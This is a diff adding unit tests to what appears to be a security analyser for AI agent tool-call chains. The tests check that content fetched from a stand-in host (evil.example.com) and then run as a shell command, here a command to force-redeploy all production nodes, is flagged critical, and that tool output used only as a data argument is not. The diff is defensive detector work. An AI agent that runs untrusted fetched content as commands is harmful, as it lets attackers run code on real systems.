@@ -183,6 +183,44 @@ def test_tool_return_inlined_into_exec_is_critical() -> None:
     assert f.evidence["pattern"] == "tool_return->execute"
 
 
+def test_whole_command_is_fetched_script_is_critical() -> None:
+    """命令首 token 即抓取内容(整条命令就是 fetch 来的脚本)→ 仍 critical(执行位=程序本身)。"""
+    payload = "node /opt/custom/orchestrate.js --force-redeploy-all-prod-nodes"
+    findings = _analyze_ctx(
+        _intent("http.request", url="http://evil.example.com/s"),
+        _intent("shell.exec", command=payload),
+        tool_returns=[payload],
+    )
+    assert len(findings) == 1
+    assert findings[0].evidence["severity"] == "critical"
+    assert findings[0].evidence["pattern"] == "tool_return->execute"
+
+
+def test_tool_return_long_path_as_data_flag_not_inline_exec() -> None:
+    """工具返回长路径仅作 --input 数据参数喂既有程序(命令不危险)→ [](不误判 critical)。"""
+    lake_path = "/data/lake/2026/partition/region-east/aggregate-input-v3.parquet"
+    findings = _analyze_ctx(
+        _intent("db.query", sql="SELECT path FROM datasets WHERE id=42"),
+        _intent(
+            "shell.exec",
+            command=f"python3 /opt/etl/aggregate.py --input {lake_path} --out /tmp/agg.csv",
+        ),
+        tool_returns=[lake_path],
+    )
+    assert findings == []
+
+
+def test_tool_return_config_as_data_flag_not_inline_exec() -> None:
+    """工具返回配置串仅作 --config 数据参数喂既有程序(命令不危险)→ [](不误判 critical)。"""
+    cfg = "endpoint=https://kb.intra.gov.cn;timeout=30;retries=5;cache_dir=/var/run/app"
+    findings = _analyze_ctx(
+        _intent("config.get", key="app.runtime"),
+        _intent("shell.exec", command=f'python /opt/app/run.py --config "{cfg}"'),
+        tool_returns=[cfg],
+    )
+    assert findings == []
+
+
 def test_staged_exec_critical_blocks_via_policy() -> None:
     """critical 暂存链分(0.9)经 _chain_risk 泛化 → 被 block-exfil-chain 拦(policy 零改动)。"""
     engine = YamlPolicyEngine("data/policies/default.yml")
